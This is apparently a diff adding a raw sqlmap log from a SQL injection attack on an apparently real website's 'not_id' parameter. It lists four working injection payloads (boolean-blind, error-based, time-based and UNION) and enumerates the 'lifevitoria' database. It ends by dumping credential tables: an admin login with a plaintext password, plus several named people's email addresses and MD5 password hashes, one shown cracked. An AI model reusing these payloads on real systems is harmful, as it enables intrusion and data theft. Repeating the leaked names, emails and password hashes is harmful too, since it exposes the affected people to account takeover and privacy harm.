@@ -1,0 +1,184 @@
+sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:
+---
+Parameter: not_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: not_id=88 AND 8492=8492
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: not_id=88 AND (SELECT 2002 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(2002=2002,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: not_id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: not_id=-4409 UNION ALL SELECT NULL,CONCAT(0x71786b6a71,0x66586a465076765274526770485266694e4d6d66727778726b505a5444766e49555a4e4b466d774a,0x71717a6b71),NULL,NULL,NULL,NULL,NULL-- yVTW
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] lifevitoria
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: not_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: not_id=88 AND 8492=8492
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: not_id=88 AND (SELECT 2002 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(2002=2002,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: not_id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: not_id=-4409 UNION ALL SELECT NULL,CONCAT(0x71786b6a71,0x66586a465076765274526770485266694e4d6d66727778726b505a5444766e49555a4e4b466d774a,0x71717a6b71),NULL,NULL,NULL,NULL,NULL-- yVTW
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: lifevitoria
+[15 tables]
++---------------------+
+| user                |
+| associados          |
+| life_ps_categoria   |
+| life_ps_faixaetaria |
+| life_ps_operadora   |
+| life_ps_planosaude  |
+| life_ps_produtos    |
+| life_ps_segmento    |
+| life_ps_tabelapreco |
+| life_tabelapreco    |
+| newsletter          |
+| noticias            |
+| solicitacao         |
+| upload              |
+| usuarios            |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: not_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: not_id=88 AND 8492=8492
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: not_id=88 AND (SELECT 2002 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(2002=2002,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: not_id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: not_id=-4409 UNION ALL SELECT NULL,CONCAT(0x71786b6a71,0x66586a465076765274526770485266694e4d6d66727778726b505a5444766e49555a4e4b466d774a,0x71717a6b71),NULL,NULL,NULL,NULL,NULL-- yVTW
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: lifevitoria
+[15 tables]
++---------------------+
+| user                |
+| associados          |
+| life_ps_categoria   |
+| life_ps_faixaetaria |
+| life_ps_operadora   |
+| life_ps_planosaude  |
+| life_ps_produtos    |
+| life_ps_segmento    |
+| life_ps_tabelapreco |
+| life_tabelapreco    |
+| newsletter          |
+| noticias            |
+| solicitacao         |
+| upload              |
+| usuarios            |
++---------------------+
+
+Database: lifevitoria
++---------------------+---------+
+| Table               | Entries |
++---------------------+---------+
+| life_ps_tabelapreco | 1037    |
+| life_tabelapreco    | 617     |
+| life_ps_produtos    | 158     |
+| noticias            | 87      |
+| life_ps_planosaude  | 56      |
+| life_ps_faixaetaria | 55      |
+| newsletter          | 17      |
+| life_ps_categoria   | 16      |
+| life_ps_operadora   | 5       |
+| life_ps_segmento    | 4       |
+| usuarios            | 4       |
+| `user`              | 1       |
+| associados          | 1       |
++---------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: not_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: not_id=88 AND 8492=8492
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: not_id=88 AND (SELECT 2002 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(2002=2002,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: not_id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: not_id=-4409 UNION ALL SELECT NULL,CONCAT(0x71786b6a71,0x66586a465076765274526770485266694e4d6d66727778726b505a5444766e49555a4e4b466d774a,0x71717a6b71),NULL,NULL,NULL,NULL,NULL-- yVTW
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: lifevitoria
+Table: user
+[1 entry]
++----+-------+-------+---------------------------+--------+--------+
+| id | senha | login | email                     | sessao | activo |
++----+-------+-------+---------------------------+--------+--------+
+| 1  | teste | admin | atendimento@icriativa.com | teste  | S      |
++----+-------+-------+---------------------------+--------+--------+
+
+Database: lifevitoria
+Table: usuarios
+[4 entries]
++--------+------------+-----------------+------------------------------------------+----------------------------+
+| USU_ID | USU_DATA   | USU_NOME        | USU_SENHA                                | USU_EMAIL                  |
++--------+------------+-----------------+------------------------------------------+----------------------------+
+| 1      | 2007-02-27 | Gérson Dorneles | 698dc19d489c4e4db73e28a713eab07b (teste) | gdorneles@gmail.com        |
+| 2      | 2007-04-23 | Iara Pandolfi   | ffff6aacf66fff294abe5c7db897fc45         | iara@brpc.com.br           |
+| 3      | 2008-02-26 | Iara            | b45311f6bdaa61572b3331d17248b980         | iara@brasilpontocom.com.br |
+| 4      | 0000-00-00 | Gérson          | 698dc19d489c4e4db73e28a713eab07b (teste) | teste                      |
++--------+------------+-----------------+------------------------------------------+----------------------------+
+
